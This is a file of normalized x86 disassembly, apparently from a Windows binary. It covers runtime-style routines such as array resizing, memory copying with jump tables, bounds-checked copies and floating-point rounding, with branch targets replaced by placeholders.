call sub_40cc72
mov eax ebx
shl eax 0x2
push eax
mov eax [ edi + 0x4 ]
add eax esi
push 0x0
push eax
call sub_415f60
mov esi [ ebp + 0x8 ]
add esp 0x1c
lea eax [ esi + ebx ]
push eax
call sub_413d91
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ edi + 0x4 ]
mov edx [ edx ]
dec ebx
mov [ eax + ecx ] edx
add eax 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
shl eax 0x2
sub_413f81
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_413f6c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_413fa2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x18 ]
push ebx
not edx
push esi
push edi
mov ebx eax
mov [ ebp + 0x10 ] ecx
test dl 0x1
je r-xdata
test ecx ecx
jne r-xdata
test eax eax
jbe r-xdata
test eax eax
jbe r-xdata
call sub_40a7dd
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov edi 0x1fffffff
cmp ebx edi
jae r-xdata
mov edi 0x1fffffff
cmp ebx edi
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov esi edi
shl esi 0x2
push esi
push [ ebp + 0x10 ]
call sub_40d269
add [ ebp + 0x10 ] esi
sub ebx edi
test ebx ebx
ja r-xdata
mov edi ebx
mov ecx [ ebp + 0x8 ]
mov esi edi
shl esi 0x2
push esi
push [ ebp + 0x10 ]
call sub_40d100
add [ ebp + 0x10 ] esi
sub ebx edi
test ebx ebx
ja r-xdata
mov edi ebx
jmp r-xdata
sub_41402a
push 0x1c
mov eax sub_425f04
call sub_415bf3
mov ebx ecx
mov [ ebp - 0x24 ] ebx
mov esi [ ebx + 0x3c ]
xor edi edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] edi
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x1
mov ecx esi
call sub_40c414
test eax eax
je r-xdata
push 0x1c
call sub_40a5cc
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
push 0x14
call sub_40a5cc
pop ecx
cmp eax edi
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
jmp sub_4140e7
xor eax eax
push 0xa
mov ecx eax
call sub_40c508
jmp r-xdata
mov [ ebp - 0x1c ] edi
mov ecx eax
call sub_413d7a
mov edi eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
mov [ ebp - 0x20 ] eax
push [ ebx + 0x40 ]
xor eax eax
inc eax
push eax
mov ecx edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] eax
call sub_413d91
push 0x1
mov ecx esi
call sub_40c596
mov [ eax ] edi
jmp sub_4140e7
sub_4140fe
push 0xc
mov eax sub_425f31
call sub_415bc0
mov esi ecx
mov eax [ esi + 0x18 ]
xor ebx ebx
not eax
inc ebx
xor edi edi
test bl al
je r-xdata
cmp [ esi + 0x38 ] edi
jne r-xdata
cmp [ esi + 0x38 ] edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
push 0x14
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] ebx
cmp ecx edi
je r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
push 0x1c
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] edi
cmp ecx edi
je r-xdata
call sub_415c98
retn 0x4
mov ecx esi
call sub_413d66
mov ecx [ esi + 0x38 ]
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x34 ]
call sub_41486b
mov ecx [ esi + 0x3c ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
mov [ ebp - 0x14 ] edi
call sub_40c414
mov ecx [ ebp - 0x14 ]
cmp ecx edi
je r-xdata
xor eax eax
call sub_41471e
jmp r-xdata
mov ecx esi
call sub_413d66
push [ ebp + 0x8 ]
mov ecx [ esi + 0x38 ]
call sub_40c596
mov ecx [ esi + 0x34 ]
mov [ eax ] ecx
jmp r-xdata
xor eax eax
push [ esi + 0x40 ]
call sub_40c508
jmp r-xdata
call sub_40a7dd
push ebx
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x34 ]
mov [ ebp + 0x8 ] 0x2
call sub_413ecc
mov eax [ eax + 0x4 ]
mov [ eax ] edi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
mov [ esi + 0x34 ] ebx
mov [ ebp - 0x10 ] edi
call sub_41402a
mov ecx [ ebp - 0x10 ]
push ebx
lea eax [ ebp - 0x18 ]
push eax
push edi
mov [ ebp - 0x18 ] edi
call sub_413ecc
push [ esi + 0x40 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ecx eax
mov [ esi + 0x38 ] eax
call sub_414745
mov eax [ esi + 0x38 ]
cmp [ eax + 0x8 ] edi
jg r-xdata
inc [ esi + 0x34 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push [ esi + 0x44 ]
mov ecx eax
mov [ esi + 0x38 ] eax
call sub_40c2eb
mov ecx [ esi + 0x38 ]
push edi
call sub_40c596
mov [ eax ] edi
mov [ esi + 0x34 ] ebx
sub_41423d
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
push [ esi + 0x14 ]
push 0x6
cmp [ ebx + 0x8 ] 0xffff
jne r-xdata
push [ esi + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
call sub_4140fe
mov ecx [ esi + 0x38 ]
push ebx
call sub_40c596
mov edi [ eax ]
mov ecx esi
test edi edi
je r-xdata
call sub_40a7c1
call sub_40d3b3
push 0xffff
call sub_40cf2b
push esi
mov ecx ebx
call sub_40d22c
mov ecx esi
call sub_413d66
mov ecx [ esi + 0x38 ]
push ebx
call sub_40c596
mov ecx [ esi + 0x34 ]
mov [ eax ] ecx
inc [ esi + 0x34 ]
mov eax 0x7fff
cmp edi eax
jae r-xdata
push eax
call sub_40cf2b
or edi 0x80000000
push edi
mov ecx esi
call sub_40cf6a
jmp r-xdata
or edi 0x8000
push edi
call sub_40cf2b
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4142ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ebx 0xffff
test eax eax
je r-xdata
push [ esi + 0x14 ]
push 0x1
push 0x0
call sub_4140fe
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_40cfa8
mov eax 0x7fff
cmp [ ebp - 0x4 ] ax
jne r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
movzx ecx [ ebp - 0x4 ]
mov eax ecx
and eax 0xffff8000
shl eax 0x10
or eax ecx
and eax 0xffff7fff
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_40cff0
mov eax [ ebp - 0xc ]
jmp r-xdata
call sub_40a7c1
cmp [ ebp - 0x4 ] bx
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edi 0x80000000
test edi eax
jne r-xdata
mov edi eax
and edi 0x7fffffff
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_40d089
mov ebx eax
test ebx ebx
jne r-xdata
mov [ ecx ] eax
xor eax eax
jmp r-xdata
push [ esi + 0x14 ]
push 0x5
jmp r-xdata
mov eax [ esi + 0x38 ]
mov eax [ eax + 0x8 ]
dec eax
cmp edi eax
ja r-xdata
mov eax [ ebx + 0x8 ]
mov ecx eax
and ecx 0x7fffffff
cmp ecx [ ebp - 0x8 ]
je r-xdata
push [ esi + 0x14 ]
push 0x6
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
call sub_40d3b3
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40c414
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_413d66
mov ecx [ esi + 0x38 ]
xor edi edi
inc edi
push edi
push ebx
push [ esi + 0x34 ]
call sub_41486b
mov ecx [ esi + 0x3c ]
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_40c414
mov ecx [ ebp - 0x10 ]
test ecx ecx
jne r-xdata
test edi eax
jne r-xdata
call sub_40a7dd
push edi
call sub_413d24
cmp [ eax ] 0x2
je r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x34 ]
mov [ ebp - 0x4 ] edi
call sub_413ecc
inc [ esi + 0x34 ]
mov eax [ ebp - 0x8 ]
jmp r-xdata
push 0x0
mov ecx esi
call sub_41402a
mov ecx [ esi + 0x3c ]
mov edi [ ebp - 0x8 ]
push ebx
call sub_40c596
mov [ eax ] edi
push [ esi + 0x14 ]
push 0x7
jmp r-xdata
mov ecx [ esi + 0x38 ]
push edi
call sub_413d45
mov ecx [ esi + 0x3c ]
and [ ebp - 0x8 ] 0x0
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x7fffffff
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_40c414
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push [ ebp + 0x8 ]
mov ecx ebx
call sub_40a661
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov [ esi + 0x10 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
sub_4144e0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
not eax
mov esi ecx
mov ecx edi
test al 0x1
je r-xdata
call sub_40d1f8
push 0xffffffff
push eax
mov ecx esi
call sub_413d91
push [ esi + 0x8 ]
call sub_40d1c7
jmp r-xdata
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push edi
call sub_413fa2
pop edi
pop esi
pop ebp
retn 0x4
sub_414522
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
not eax
push edi
test al 0x1
jne r-xdata
push 0x0
call sub_4140fe
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_40d3b3
mov ecx [ esi + 0x38 ]
push ebx
push edi
call sub_40c596
mov ebx [ eax ]
test ebx ebx
je r-xdata
push edi
mov ecx esi
call sub_40cf2b
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax ]
push eax
mov ecx esi
call sub_41423d
mov ecx esi
call sub_413d66
mov ecx [ esi + 0x38 ]
push edi
call sub_40c596
mov ecx [ esi + 0x34 ]
mov [ eax ] ecx
inc [ esi + 0x34 ]
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x8 ]
mov eax 0x7fff
mov ecx esi
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebp
retn 0x4
push eax
call sub_40cf2b
push ebx
mov ecx esi
call sub_40cf6a
jmp r-xdata
push ebx
call sub_40cf2b
jmp r-xdata
pop ebx
sub_4145be
push 0x14
mov eax sub_425f4c
call sub_415bf3
mov esi ecx
test [ esi + 0x18 ] 0x1
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_4142ec
xor ebx ebx
mov [ ebp - 0x14 ] ebx
cmp eax ebx
jne r-xdata
push [ esi + 0x14 ]
push 0x4
mov ecx eax
mov [ ebp - 0x4 ] ebx
call sub_40a617
mov edi eax
mov [ ebp - 0x14 ] edi
cmp edi ebx
jne r-xdata
mov eax [ esi + 0x38 ]
mov eax [ eax + 0x8 ]
mov edi [ ebp - 0x18 ]
dec eax
cmp edi eax
jbe r-xdata
mov ecx esi
call sub_413d66
mov ecx [ esi + 0x38 ]
push 0x1
push edi
push [ esi + 0x34 ]
call sub_41486b
mov ecx [ esi + 0x3c ]
lea eax [ ebp + 0x8 ]
push eax
push 0x1
mov [ ebp + 0x8 ] ebx
call sub_40c414
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp ecx ebx
setne al
cmp eax ebx
je r-xdata
call sub_40a7a5
mov ecx [ esi + 0x3c ]
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov [ ebp - 0x14 ] ebx
call sub_40c414
test eax eax
je r-xdata
push [ esi + 0x14 ]
push 0x5
jmp r-xdata
call sub_40a7dd
push 0x1
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x34 ]
mov [ ebp - 0x18 ] 0x2
call sub_413ecc
mov eax [ ebp - 0x1c ]
mov ebx [ esi + 0x10 ]
inc [ esi + 0x34 ]
mov [ esi + 0x10 ] eax
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x8 ]
mov [ esi + 0x10 ] ebx
mov ecx [ esi + 0x38 ]
push edi
call sub_413d45
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
jne r-xdata
call sub_40d3b3
mov eax edi
call sub_415c98
retn 0x4
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ ecx + 0x8 ]
dec eax
cmp edi eax
ja r-xdata
push [ ebp + 0x8 ]
mov ecx edi
call sub_40a68c
test eax eax
jne r-xdata
push edi
call sub_413d24
cmp [ eax ] 0x1
je r-xdata
push [ esi + 0x14 ]
push 0x6
jmp r-xdata
sub_414745
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
jge r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jl r-xdata
call sub_40a7dd
cmp edi ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
push [ esi + 0x4 ]
call sub_40a5fb
pop ecx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ebx [ esi + 0xc ]
cmp edi ebx
jg r-xdata
mov ebx edi
shl ebx 0x2
push ebx
call sub_40a5cc
push ebx
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_415f60
add esp 0x10
mov [ esi + 0xc ] edi
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp edi eax
jle r-xdata
mov [ esi + 0x8 ] edi
jmp r-xdata
add eax ebx
cmp edi eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax 0x4
jl r-xdata
mov edx edi
sub edx eax
shl edx 0x2
push edx
lea eax [ ecx + eax * 4 ]
push 0x0
push eax
call sub_415f60
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
cmp eax ebx
jl r-xdata
mov [ ebp + 0x8 ] edi
push 0x4
pop eax
mov ecx 0x400
cmp eax ecx
jle r-xdata
shl eax 0x2
push eax
call sub_40a5cc
mov ebx eax
mov eax [ esi + 0x8 ]
shl eax 0x2
push eax
push [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
shl eax 0x2
push eax
push ebx
call sub_40c024
mov eax [ esi + 0x8 ]
mov ecx edi
sub ecx eax
shl ecx 0x2
push ecx
lea eax [ ebx + eax * 4 ]
push 0x0
push eax
call sub_415f60
push [ esi + 0x4 ]
call sub_40a5fb
mov eax [ ebp + 0x8 ]
add esp 0x24
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
cmp eax 0x4
jge r-xdata
mov eax ecx
jmp r-xdata
sub_41486b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jl r-xdata
call sub_40a7dd
mov ebx [ ebp + 0x10 ]
test ebx ebx
jle r-xdata
cmp edi [ esi + 0x8 ]
push 0xffffffff
jl r-xdata
mov edi [ esi + 0x8 ]
lea eax [ edi + ebx ]
push eax
call sub_414745
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
sub edi eax
lea edx [ ecx + eax * 4 ]
shl edi 0x2
push edi
push edx
mov edx [ esi + 0x8 ]
sub edx eax
sub edx ebx
shl edx 0x2
add eax ebx
push edx
lea eax [ ecx + eax * 4 ]
push eax
call sub_40cc72
mov ecx [ esi + 0x4 ]
mov eax ebx
shl eax 0x2
push eax
mov eax [ ebp + 0x8 ]
shl eax 0x2
add ecx eax
push 0x0
push ecx
call sub_415f60
mov edi [ ebp + 0x8 ]
add esp 0x1c
lea eax [ edi + ebx ]
push eax
call sub_414745
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0xc ]
dec ebx
mov [ eax + ecx ] edx
add eax 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax edi
shl eax 0x2
sub_414911
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_414735
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_414991
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x18 ]
push esi
not eax
mov esi ecx
push edi
mov ecx ebx
test al 0x1
je r-xdata
call sub_40d1f8
push 0xffffffff
push eax
mov ecx esi
call sub_414745
xor edi edi
cmp [ esi + 0x8 ] edi
jle r-xdata
push [ esi + 0x8 ]
call sub_40d1c7
xor edi edi
cmp [ esi + 0x8 ] edi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
push eax
push ebx
call sub_41494f
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
mov eax [ esi + 0x4 ]
push [ eax + edi * 4 ]
push ebx
call sub_414938
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
jmp r-xdata
sub_414a12
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_414981
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_414a50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_414ad8 ]
jmp [ ecx * 4 + jump_table_414b58 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_414bc4 ]
pop esi
pop edi
pop ebp
jmp sub_418778
jmp [ ecx * 4 + jump_table_414d60 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_414c64 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_414d60 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_414bc4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_414d60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_414bc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_414bc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_414bc4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_414d60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_414d60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_414d60 ]
sub_414dc0
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push [ rw-data ]
call sub_41f6af
fld [ ebp + 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp + 0xe ]
mov ebx eax
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
call sub_41f535
fstp [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
pop ecx
fcomp [ ebp - 0x8 ]
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_41f575
pop ecx
pop ecx
test eax eax
jle r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
push ebx
call sub_41f6af
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
push ebx
fadd [ r--data ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
push ebx
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
leave
retn
call sub_41f46c
add esp 0x1c
push esi
push ebx
call sub_41f6af
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
fld [ ebp + 0x8 ]
push ebx
push ecx
push ecx
fstp [ esp ]
push 0xc
call sub_41f417
add esp 0x10
jmp r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_41891a
add esp 0x10
sub_414eed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_414edd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_414f0e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_418d30
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_414f2e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_414a50
add esp 0xc
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_414f9c
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
